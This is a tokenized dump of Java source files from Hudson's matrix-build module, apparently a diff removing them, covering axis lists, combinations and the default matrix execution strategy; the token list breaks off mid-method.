"*", "/", "package", "hudson", ".", "matrix", ";", "import", "com", ".", "google", ".", "common", ".", "base", ".", "Function", ";", "import", "com", ".", "google", ".", "common", ".", "collect", ".", "Iterables", ";", "import", "com", ".", "google", ".", "common", ".", "collect", ".", "Lists", ";", "import", "com", ".", "google", ".", "common", ".", "collect", ".", "Sets", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "XStream", ";", "import", "hudson", ".", "Util", ";", "import", "hudson", ".", "util", ".", "RobustCollectionConverter", ";", "import", "javax", ".", "annotation", ".", "Nullable", ";", "import", "java", ".", "util", ".", "*;", "/", "**", "*", "List", "of", "{", "@", "link", "Axis", "}", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "AxisList", "extends", "ArrayList", "<", "Axis", ">", "{", "public", "AxisList", "(", ")", "{", "}", "public", "AxisList", "(", "Collection", "<", "?", "extends", "Axis", ">", "c", ")", "{", "super", "(", "c", ")", ";", "}", "public", "AxisList", "(", "Axis", ".", "..", "c", ")", "{", "this", "(", "Arrays", ".", "asList", "(", "c", ")", ");", "}", "public", "Axis", "find", "(", "String", "name", ")", "{", "for", "(", "Axis", "a", ":", "this", ")", "{", "if", "(", "a", ".", "name", ".", "equals", "(", "name", ")", ")", "return", "a", ";", "}", "return", "null", ";", "}", "/", "**", "*", "Creates", "a", "subset", "of", "the", "list", "that", "only", "contains", "the", "type", "assignable", "to", "the", "specified", "type", ".", "*", "/", "public", "AxisList", "subList", "(", "Class", "<", "?", "extends", "Axis", ">", "subType", ")", "{", "return", "new", "AxisList", "(", "Util", ".", "filter", "(", "this", ",", "subType", ")", ");", "}", "@", "Override", "public", "boolean", "add", "(", "Axis", "axis", ")", "{", "return", "axis", "!", "=", "null", "&", "&", "super", ".", "add", "(", "axis", ")", ";", "}", "/", "**", "*", "List", "up", "all", "the", "possible", "combinations", "of", "this", "list", ".", "*", "/", "public", "Iterable", "<", "Combination", ">", "list", "(", ")", "{", "List", "<", "Set", "<", "String", ">", ">", "axesList", "=", "Lists", ".", "newArrayList", "(", ");", "for", "(", "Axis", "axis", ":", "this", ")", "axesList", ".", "add", "(", "new", "LinkedHashSet", "<", "String", ">", "(", "axis", ".", "getValues", "(", "))", ");", "return", "Iterables", ".", "transform", "(", "Sets", ".", "cartesianProduct", "(", "axesList", ")", ",", "new", "Function", "<", "List", "<", "String", ">", ",", "Combination", ">", "()", "{", "public", "Combination", "apply", "(", "@", "Nullable", "List", "<", "String", ">", "strings", ")", "{", "assert", "strings", "!", "=", "null", ";", "return", "new", "Combination", "(", "AxisList", ".", "this", ",", "(", "String", "[", "])", "strings", ".", "toArray", "(", "new", "String", "[", "0", "]", "))", ";", "}", "}", ");", "}", "/", "**", "*", "{", "@", "link", "com", ".", "thoughtworks", ".", "xstream", ".", "converters", ".", "Converter", "}", "implementation", "for", "XStream", ".", "*", "/", "public", "static", "final", "class", "ConverterImpl", "extends", "RobustCollectionConverter", "{", "public", "ConverterImpl", "(", "XStream", "xs", ")", "{", "super", "(", "xs", ")", ";", "}", "@", "Override", "public", "boolean", "canConvert", "(", "Class", "type", ")", "{", "return", "type", "=", "=", "AxisList", ".", "class", ";", "}", "@", "Override", "protected", "Object", "createCollection", "(", "Class", "type", ")", "{", "return", "new", "AxisList", "(", ");", "}", "}", "}", "@", "@", "-", "1", ",", "265", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "groovy", ".", "lang", ".", "Binding", ";", "import", "hudson", ".", "Util", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Iterator", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "java", ".", "util", ".", "StringTokenizer", ";", "import", "java", ".", "util", ".", "TreeMap", ";", "/", "**", "*", "A", "particular", "combination", "of", "{", "@", "link", "Axis", "}", "values", ".", "*", "*", "For", "example", ",", "when", "axes", "are", "\"", "x", "=", "{", "1", ",", "2", "}", ",", "y", "=", "{", "3", ",", "4", "}", "\",", "then", "*", "[", "x", "=", "1", ",", "y", "=", "3", "]", "is", "a", "combination", "(", "out", "of", "4", "possible", "combinations", ")", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "final", "class", "Combination", "extends", "TreeMap", "<", "String", ",", "String", ">", "implements", "Comparable", "<", "Combination", ">", "{", "public", "Combination", "(", "AxisList", "axisList", ",", "List", "<", "String", ">", "values", ")", "{", "for", "(", "int", "i", "=", "0", ";", "i", "<", "axisList", ".", "size", "(", ");", "i", "+", "+)", "super", ".", "put", "(", "axisList", ".", "get", "(", "i", ")", ".", "getName", "(", "),", "values", ".", "get", "(", "i", ")", ");", "}", "public", "Combination", "(", "AxisList", "axisList", ",", "String", ".", "..", "values", ")", "{", "this", "(", "axisList", ",", "Arrays", ".", "asList", "(", "values", ")", ");", "}", "public", "Combination", "(", "Map", "<", "String", ",", "String", ">", "keyValuePairs", ")", "{", "for", "(", "Map", ".", "Entry", "<", "String", ",", "String", ">", "e", ":", "keyValuePairs", ".", "entrySet", "(", "))", "super", ".", "put", "(", "e", ".", "getKey", "(", "),", "e", ".", "getValue", "(", "))", ";", "}", "public", "String", "get", "(", "Axis", "a", ")", "{", "return", "get", "(", "a", ".", "getName", "(", "))", ";", "}", "/", "**", "*", "Obtains", "the", "continuous", "unique", "index", "number", "of", "this", "{", "@", "link", "Combination", "}", "*", "in", "the", "given", "{", "@", "link", "AxisList", "}", ".", "*", "/", "public", "int", "toIndex", "(", "AxisList", "axis", ")", "{", "int", "r", "=", "0", ";", "for", "(", "Axis", "a", ":", "axis", ")", "{", "r", "*", "=", "a", ".", "size", "(", ");", "r", "+", "=", "a", ".", "indexOf", "(", "get", "(", "a", ")", ");", "}", "return", "r", ";", "}", "/", "**", "*", "Evaluates", "the", "given", "Groovy", "expression", "with", "values", "bound", "from", "this", "combination", ".", "*", "*", "<", "p", ">", "*", "For", "example", ",", "if", "this", "combination", "is", "a", "=", "X", ",", "b", "=", "Y", ",", "then", "expressions", "like", "<", "tt", ">", "a", "=", "=\"", "X", "\"", "</", "tt", ">", "would", "evaluate", "to", "*", "true", ".", "*", "/", "public", "boolean", "evalGroovyExpression", "(", "AxisList", "axes", ",", "String", "expression", ")", "{", "return", "evalGroovyExpression", "(", "axes", ",", "expression", ",", "new", "Binding", "(", "))", ";", "}", "/", "**", "*", "@", "see", "#", "evalGroovyExpression", "(", "AxisList", ",", "String", ")", "*", "@", "since", "1", ".", "515", "*", "@", "deprecated", "as", "of", "1", ".", "528", "*", "Use", "{", "@", "link", "FilterScript", "#", "apply", "(", "hudson", ".", "matrix", ".", "MatrixBuild", ".", "MatrixBuildExecution", ",", "Combination", ")", "}", "*", "/", "public", "boolean", "evalGroovyExpression", "(", "AxisList", "axes", ",", "String", "expression", ",", "Binding", "binding", ")", "{", "return", "FilterScript", ".", "parse", "(", "expression", ")", ".", "apply", "(", "axes", ",", "this", ",", "binding", ")", ";", "}", "public", "int", "compareTo", "(", "Combination", "that", ")", "{", "int", "d", "=", "this", ".", "size", "(", ")-", "that", ".", "size", "(", ");", "if", "(", "d", "!", "=", "0", ")", "return", "d", ";", "Iterator", "<", "Map", ".", "Entry", "<", "String", ",", "String", ">", ">", "itr", "=", "this", ".", "entrySet", "(", ").", "iterator", "(", ");", "Iterator", "<", "Map", ".", "Entry", "<", "String", ",", "String", ">", ">", "jtr", "=", "that", ".", "entrySet", "(", ").", "iterator", "(", ");", "while", "(", "itr", ".", "hasNext", "(", "))", "{", "Map", ".", "Entry", "<", "String", ",", "String", ">", "i", "=", "itr", ".", "next", "(", ");", "Map", ".", "Entry", "<", "String", ",", "String", ">", "j", "=", "jtr", ".", "next", "(", ");", "d", "=", "i", ".", "getKey", "(", ").", "compareTo", "(", "j", ".", "getKey", "(", "))", ";", "if", "(", "d", "!", "=", "0", ")", "return", "d", ";", "d", "=", "i", ".", "getValue", "(", ").", "compareTo", "(", "j", ".", "getValue", "(", "))", ";", "if", "(", "d", "!", "=", "0", ")", "return", "d", ";", "}", "return", "0", ";", "}", "/", "**", "*", "Works", "like", "{", "@", "link", "#", "toString", "(", ")}", "but", "only", "include", "the", "given", "axes", ".", "*", "/", "public", "String", "toString", "(", "Collection", "<", "Axis", ">", "subset", ")", "{", "if", "(", "size", "(", ")=", "=", "1", "&", "&", "subset", ".", "size", "(", ")=", "=", "1", ")", "return", "values", "(", ").", "iterator", "(", ").", "next", "(", ");", "StringBuilder", "buf", "=", "new", "StringBuilder", "(", ");", "for", "(", "Axis", "a", ":", "subset", ")", "{", "if", "(", "buf", ".", "length", "(", ")>", "0", ")", "buf", ".", "append", "(", "',", "')", ";", "buf", ".", "append", "(", "a", ".", "getName", "(", "))", ".", "append", "(", "'=", "')", ".", "append", "(", "get", "(", "a", ")", ");", "}", "if", "(", "buf", ".", "length", "(", ")=", "=", "0", ")", "buf", ".", "append", "(", "\"", "default", "\"", ");", "/", "/", "special", "case", "to", "avoid", "0", "-", "length", "name", ".", "return", "buf", ".", "toString", "(", ");", "}", "/", "**", "*", "Gets", "the", "values", "that", "correspond", "to", "the", "specified", "axes", ",", "in", "their", "order", ".", "*", "/", "public", "List", "<", "String", ">", "values", "(", "Collection", "<", "?", "extends", "Axis", ">", "axes", ")", "{", "List", "<", "String", ">", "r", "=", "new", "ArrayList", "<", "String", ">", "(", "axes", ".", "size", "(", "))", ";", "for", "(", "Axis", "a", ":", "axes", ")", "r", ".", "add", "(", "get", "(", "a", ")", ");", "return", "r", ";", "}", "/", "**", "*", "Converts", "to", "the", "ID", "string", "representation", ":", "*", "<", "tt", ">", "axisName", "=", "value", ",", "axisName", "=", "value", ",", "..", ".<", "/", "tt", ">", "*", "*", "@", "param", "sep1", "*", "The", "separator", "between", "multiple", "axes", ".", "*", "@", "param", "sep2", "*", "The", "separator", "between", "axis", "name", "and", "value", ".", "*", "/", "public", "String", "toString", "(", "char", "sep1", ",", "char", "sep2", ")", "{", "StringBuilder", "buf", "=", "new", "StringBuilder", "(", ");", "for", "(", "Map", ".", "Entry", "<", "String", ",", "String", ">", "e", ":", "entrySet", "(", "))", "{", "if", "(", "buf", ".", "length", "(", ")>", "0", ")", "buf", ".", "append", "(", "sep1", ")", ";", "buf", ".", "append", "(", "e", ".", "getKey", "(", "))", ".", "append", "(", "sep2", ")", ".", "append", "(", "e", ".", "getValue", "(", "))", ";", "}", "if", "(", "buf", ".", "length", "(", ")=", "=", "0", ")", "buf", ".", "append", "(", "\"", "default", "\"", ");", "/", "/", "special", "case", "to", "avoid", "0", "-", "length", "name", ".", "return", "buf", ".", "toString", "(", ");", "}", "@", "Override", "public", "String", "toString", "(", ")", "{", "return", "toString", "(", "',", "',", "'=", "')", ";", "}", "/", "**", "*", "Gets", "the", "8", "character", "-", "wide", "hash", "code", "for", "this", "combination", "*", "/", "public", "String", "digest", "(", ")", "{", "return", "Util", ".", "getDigestOf", "(", "toString", "(", "))", ";", "}", "/", "**", "*", "Reverse", "operation", "of", "{", "@", "link", "#", "toString", "(", ")}", ".", "*", "/", "public", "static", "Combination", "fromString", "(", "String", "id", ")", "{", "if", "(", "id", ".", "equals", "(", "\"", "default", "\"", "))", "return", "new", "Combination", "(", "Collections", ".", "<", "String", ",", "String", ">", "emptyMap", "(", "))", ";", "Map", "<", "String", ",", "String", ">", "m", "=", "new", "HashMap", "<", "String", ",", "String", ">", "()", ";", "StringTokenizer", "tokens", "=", "new", "StringTokenizer", "(", "id", ",", "\"", ",\"", ");", "while", "(", "tokens", ".", "hasMoreTokens", "(", "))", "{", "String", "token", "=", "tokens", ".", "nextToken", "(", ");", "int", "idx", "=", "token", ".", "indexOf", "(", "'=", "')", ";", "if", "(", "idx", "<", "0", ")", "throw", "new", "IllegalArgumentException", "(", "\"", "Can", "'", "t", "parse", "\"", "+", "id", ")", ";", "m", ".", "put", "(", "token", ".", "substring", "(", "0", ",", "idx", ")", ",", "token", ".", "substring", "(", "idx", "+", "1", ")", ");", "}", "return", "new", "Combination", "(", "m", ")", ";", "}", "/", "**", "*", "Creates", "compact", "string", "representation", "suitable", "for", "display", "purpose", ".", "*", "*", "<", "p", ">", "*", "The", "string", "is", "made", "compact", "by", "looking", "for", "{", "@", "link", "Axis", "}", "whose", "values", "*", "are", "unique", ",", "and", "omit", "the", "axis", "name", ".", "*", "/", "public", "String", "toCompactString", "(", "AxisList", "axes", ")", "{", "Set", "<", "String", ">", "nonUniqueAxes", "=", "new", "HashSet", "<", "String", ">", "()", ";", "Map", "<", "String", ",", "Axis", ">", "axisByValue", "=", "new", "HashMap", "<", "String", ",", "Axis", ">", "()", ";", "for", "(", "Axis", "a", ":", "axes", ")", "{", "for", "(", "String", "v", ":", "a", ".", "getValues", "(", "))", "{", "Axis", "old", "=", "axisByValue", ".", "put", "(", "v", ",", "a", ")", ";", "if", "(", "old", "!", "=", "null", ")", "{", "/", "/", "these", "two", "axes", "have", "colliding", "values", "nonUniqueAxes", ".", "add", "(", "old", ".", "getName", "(", "))", ";", "nonUniqueAxes", ".", "add", "(", "a", ".", "getName", "(", "))", ";", "}", "}", "}", "StringBuilder", "buf", "=", "new", "StringBuilder", "(", ");", "for", "(", "Map", ".", "Entry", "<", "String", ",", "String", ">", "e", ":", "entrySet", "(", "))", "{", "if", "(", "buf", ".", "length", "(", ")>", "0", ")", "buf", ".", "append", "(", "',", "')", ";", "if", "(", "nonUniqueAxes", ".", "contains", "(", "e", ".", "getKey", "(", "))", ")", "buf", ".", "append", "(", "e", ".", "getKey", "(", "))", ".", "append", "(", "'=", "')", ";", "buf", ".", "append", "(", "e", ".", "getValue", "(", "))", ";", "}", "if", "(", "buf", ".", "length", "(", ")=", "=", "0", ")", "buf", ".", "append", "(", "\"", "default", "\"", ");", "/", "/", "special", "case", "to", "avoid", "0", "-", "length", "name", ".", "return", "buf", ".", "toString", "(", ");", "}", "/", "/", "read", "-", "only", "@", "Override", "public", "void", "clear", "(", ")", "{", "throw", "new", "UnsupportedOperationException", "(", ");", "}", "@", "Override", "public", "void", "putAll", "(", "Map", "<", "?", "extends", "String", ",", "?", "extends", "String", ">", "map", ")", "{", "throw", "new", "UnsupportedOperationException", "(", ");", "}", "@", "Override", "public", "String", "put", "(", "String", "key", ",", "String", "value", ")", "{", "throw", "new", "UnsupportedOperationException", "(", ");", "}", "@", "Override", "public", "String", "remove", "(", "Object", "key", ")", "{", "throw", "new", "UnsupportedOperationException", "(", ");", "}", "/", "**", "*", "Duck", "-", "typing", "for", "boolean", "expressions", ".", "*", "*", "@", "see", "Combination", "#", "evalGroovyExpression", "(", "AxisList", ",", "String", ")", "*", "/", "public", "static", "final", "class", "BooleanCategory", "{", "/", "**", "*", "x", "-", ">", "y", "*", "/", "public", "static", "Boolean", "implies", "(", "Boolean", "lhs", ",", "Boolean", "rhs", ")", "{", "return", "!", "lhs", "|", "|", "rhs", ";", "}", "}", "}", "@", "@", "-", "1", ",", "48", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2010", ",", "InfraDNA", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "Extension", ";", "/", "**", "*", "{", "@", "link", "AxisDescriptor", "}", "for", "manually", "entered", "default", "axis", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "@", "Extension", "public", "class", "DefaultAxisDescriptor", "extends", "AxisDescriptor", "{", "public", "DefaultAxisDescriptor", "(", ")", "{", "super", "(", "Axis", ".", "class", ")", ";", "}", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "\"", "Axis", "\"", ";", "}", "@", "Override", "public", "boolean", "isInstantiable", "(", ")", "{", "return", "false", ";", "}", "}", "@", "@", "-", "1", ",", "300", "+", "0", ",", "0", "@", "@", "package", "hudson", ".", "matrix", ";", "import", "groovy", ".", "lang", ".", "GroovyRuntimeException", ";", "import", "hudson", ".", "AbortException", ";", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "console", ".", "ModelHyperlinkNote", ";", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ".", "MatrixBuildExecution", ";", "import", "hudson", ".", "matrix", ".", "listeners", ".", "MatrixBuildListener", ";", "import", "hudson", ".", "model", ".", "BuildListener", ";", "import", "hudson", ".", "model", ".", "Cause", ".", "UpstreamCause", ";", "import", "hudson", ".", "model", ".", "Queue", ";", "import", "hudson", ".", "model", ".", "ResourceController", ";", "import", "hudson", ".", "model", ".", "Result", ";", "import", "hudson", ".", "model", ".", "Run", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "DataBoundConstructor", ";", "import", "javax", ".", "annotation", ".", "Nullable", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "PrintStream", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "Comparator", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "TreeSet", ";", "/", "**", "*", "{", "@", "link", "MatrixExecutionStrategy", "}", "that", "captures", "historical", "behavior", ".", "*", "*", "<", "p", ">", "*", "This", "class", "is", "somewhat", "complex", "because", "historically", "this", "wasn", "'", "t", "an", "extension", "point", "and", "so", "*", "people", "tried", "to", "put", "various", "logics", "that", "cover", "different", "use", "cases", "into", "one", "place", ".", "*", "Going", "forward", ",", "people", "are", "encouraged", "to", "create", "subtypes", "to", "implement", "a", "custom", "logic", "that", "suits", "their", "needs", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "@", "since", "1", ".", "456", "*", "/", "public", "class", "DefaultMatrixExecutionStrategyImpl", "extends", "MatrixExecutionStrategy", "{", "private", "volatile", "boolean", "runSequentially", ";", "/", "**", "*", "Filter", "to", "select", "a", "number", "of", "combinations", "to", "build", "first", "*", "/", "private", "volatile", "String", "touchStoneCombinationFilter", ";", "/", "**", "*", "Required", "result", "on", "the", "touchstone", "combinations", ",", "in", "order", "to", "*", "continue", "with", "the", "rest", "*", "/", "private", "volatile", "Result", "touchStoneResultCondition", ";", "private", "volatile", "MatrixConfigurationSorter", "sorter", ";", "@", "DataBoundConstructor", "public", "DefaultMatrixExecutionStrategyImpl", "(", "Boolean", "runSequentially", ",", "boolean", "hasTouchStoneCombinationFilter", ",", "String", "touchStoneCombinationFilter", ",", "Result", "touchStoneResultCondition", ",", "MatrixConfigurationSorter", "sorter", ")", "{", "this", "(", "runSequentially", "!", "=", "null", "?", "runSequentially", ":", "false", ",", "hasTouchStoneCombinationFilter", "?", "touchStoneCombinationFilter", ":", "null", ",", "hasTouchStoneCombinationFilter", "?", "touchStoneResultCondition", ":", "null", ",", "sorter", ")", ";", "}", "public", "DefaultMatrixExecutionStrategyImpl", "(", "boolean", "runSequentially", ",", "String", "touchStoneCombinationFilter", ",", "Result", "touchStoneResultCondition", ",", "MatrixConfigurationSorter", "sorter", ")", "{", "this", ".", "runSequentially", "=", "runSequentially", ";", "this", ".", "touchStoneCombinationFilter", "=", "touchStoneCombinationFilter", ";", "this", ".", "touchStoneResultCondition", "=", "touchStoneResultCondition", ";", "this", ".", "sorter", "=", "sorter", ";", "}", "public", "DefaultMatrixExecutionStrategyImpl", "(", ")", "{", "this", "(", "false", ",", "false", ",", "null", ",", "null", ",", "null", ")", ";", "}", "public", "boolean", "getHasTouchStoneCombinationFilter", "(", ")", "{", "return", "touchStoneCombinationFilter", "!", "=", "null", ";", "}", "/", "**", "*", "If", "true", ",", "{", "@", "link", "MatrixRun", "}", "s", "are", "run", "sequentially", ",", "instead", "of", "running", "in", "parallel", ".", "*", "*", "TODO", ":", "this", "should", "be", "subsumed", "by", "{", "@", "link", "ResourceController", "}", ".", "*", "/", "public", "boolean", "isRunSequentially", "(", ")", "{", "return", "runSequentially", ";", "}", "public", "void", "setRunSequentially", "(", "boolean", "runSequentially", ")", "{", "this", ".", "runSequentially", "=", "runSequentially", ";", "}", "public", "String", "getTouchStoneCombinationFilter", "(", ")", "{", "return", "touchStoneCombinationFilter", ";", "}", "public", "void", "setTouchStoneCombinationFilter", "(", "String", "touchStoneCombinationFilter", ")", "{", "this", ".", "touchStoneCombinationFilter", "=", "touchStoneCombinationFilter", ";", "}", "public", "Result", "getTouchStoneResultCondition", "(", ")", "{", "return", "touchStoneResultCondition", ";", "}", "public", "void", "setTouchStoneResultCondition", "(", "Result", "touchStoneResultCondition", ")", "{", "this", ".", "touchStoneResultCondition", "=", "touchStoneResultCondition", ";", "}", "public", "MatrixConfigurationSorter", "getSorter", "(", ")", "{", "return", "sorter", ";", "}", "public", "void", "setSorter", "(", "MatrixConfigurationSorter", "sorter", ")", "{", "this", ".", "sorter", "=", "sorter", ";", "}", "@", "Override", "public", "Result", "run", "(", "MatrixBuildExecution", "execution", ")", "throws", "InterruptedException", ",", "IOException", "{", "Collection", "<", "MatrixConfiguration", ">", "touchStoneConfigurations", "=", "new", "HashSet", "<", "MatrixConfiguration", ">", "()", ";", "Collection", "<", "MatrixConfiguration", ">", "delayedConfigurations", "=", "new", "HashSet", "<", "MatrixConfiguration", ">", "()", ";", "filterConfigurations", "(", "execution", ",", "touchStoneConfigurations", ",", "delayedConfigurations", ")", ";", "if", "(", "notifyStartBuild", "(", "execution", ".", "getAggregators", "(", "))", ")", "return", "Result", ".", "FAILURE", ";", "if", "(", "sorter", "!", "=", "null", ")", "{", "touchStoneConfigurations", "=", "createTreeSet", "(", "touchStoneConfigurations", ",", "sorter", ")", ";", "delayedConfigurations", "=", "createTreeSet", "(", "delayedConfigurations", ",", "sorter", ")", ";", "}", "if", "(", "!", "runSequentially", ")", "for", "(", "MatrixConfiguration", "c", ":", "touchStoneConfigurations", ")", "scheduleConfigurationBuild", "(", "execution", ",", "c", ")", ";", "Result", "r", "=", "Result", ".", "SUCCESS", ";", "for", "(", "MatrixConfiguration", "c", ":", "touchStoneConfigurations", ")", "{", "if", "(", "runSequentially", ")", "scheduleConfigurationBuild", "(", "execution", ",", "c", ")", ";", "MatrixRun", "run", "=", "waitForCompletion", "(", "execution", ",", "c", ")", ";", "notifyEndBuild", "(", "run", ",", "execution", ".", "getAggregators", "(", "))", ";", "r", "=", "r", ".", "combine", "(", "getResult", "(", "run", ")", ");", "}", "PrintStream", "logger", "=", "execution", ".", "getListener", "(", ").", "getLogger", "(", ");", "if", "(", "touchStoneResultCondition", "!", "=", "null", "&", "&", "r", ".", "isWorseThan", "(", "touchStoneResultCondition", ")", ")", "{", "logger", ".", "printf", "(", "\"", "Touchstone", "configurations", "resulted", "in", "%", "s", ",", "so", "aborting", ".", "..", "%", "n", "\"", ",", "r", ")", ";", "return", "r", ";", "}", "if", "(", "!", "runSequentially", ")", "for", "(", "MatrixConfiguration", "c", ":", "delayedConfigurations", ")", "scheduleConfigurationBuild", "(", "execution", ",", "c", ")", ";", "for", "(", "MatrixConfiguration", "c", ":", "delayedConfigurations", ")", "{", "if", "(", "runSequentially", ")", "scheduleConfigurationBuild", "(", "execution", ",", "c", ")", ";", "MatrixRun", "run", "=", "waitForCompletion", "(", "execution", ",", "c", ")", ";", "notifyEndBuild", "(", "run", ",", "execution", ".", "getAggregators", "(", "))", ";", "logger", ".", "println", "(", "Messages", ".", "MatrixBuild_Completed", "(", "ModelHyperlinkNote", ".", "encodeTo", "(", "c", ")", ",", "getResult", "(", "run", ")", "))", ";", "r", "=", "r", ".", "combine", "(", "getResult", "(", "run", ")", ");", "}", "return", "r", ";", "}", "private", "void", "filterConfigurations", "(", "final", "MatrixBuildExecution", "execution", ",", "final", "Collection", "<", "MatrixConfiguration", ">", "touchStoneConfigurations", ",", "final", "Collection", "<", "MatrixConfiguration", ">", "delayedConfigurations", ")", "throws", "AbortException", "{", "final", "MatrixBuild", "build", "=", "execution", ".", "getBuild", "(", ");", "final", "FilterScript", "combinationFilter", "=", "FilterScript", ".", "parse", "(", "execution", ".", "getProject", "(", ").", "getCombinationFilter", "(", "),", "FilterScript", ".", "ACCEPT_ALL", ")", ";", "final", "FilterScript", "touchStoneFilter", "=", "FilterScript", ".", "parse", "(", "getTouchStoneCombinationFilter", "(", "),", "FilterScript", ".", "REJECT_ALL", ")", ";", "try", "{", "for", "(", "MatrixConfiguration", "c", ":", "execution", ".", "getActiveConfigurations", "(", "))", "{", "if", "(", "!", "MatrixBuildListener", ".", "buildConfiguration", "(", "build", ",", "c", ")", ")", "continue", ";", "/", "/", "skip", "rebuild", "final", "Combination", "combination", "=", "c", ".", "getCombination", "(", ");", "if", "(", "touchStoneFilter", "!", "=", "null", "&", "&", "touchStoneFilter", ".", "apply", "(", "execution", ",", "combination", ")", ")", "{", "touchStoneConfigurations", ".", "add", "(", "c", ")", ";", "}", "else", "if", "(", "combinationFilter", ".", "apply", "(", "execution", ",", "combination", ")", ")", "{", "delayedConfigurations", ".", "add", "(", "c", ")", ";", "}", "}", "}", "catch", "(", "GroovyRuntimeException", "ex", ")", "{", "PrintStream", "logger", "=", "execution", ".", "getListener", "(", ").", "getLogger", "(", ");", "logger", ".", "println", "(", "ex", ".", "getMessage", "(", "))", ";", "ex", ".", "printStackTrace", "(", "logger", ")", ";", "throw", "new", "AbortException", "(", "\"", "Failed", "executing", "combination", "filter", "\"", ");", "}", "}", "private", "Result", "getResult", "(", "@", "Nullable", "MatrixRun", "run", ")", "{", "/", "/", "null", "indicates", "that", "the", "run", "was", "cancelled", "before", "it", "even", "gets", "going", "return", "run", "!", "=", "null", "?", "run", ".", "getResult", "(", ")", ":", "Result", ".", "ABORTED", ";", "}", "private", "boolean", "notifyStartBuild", "(", "List", 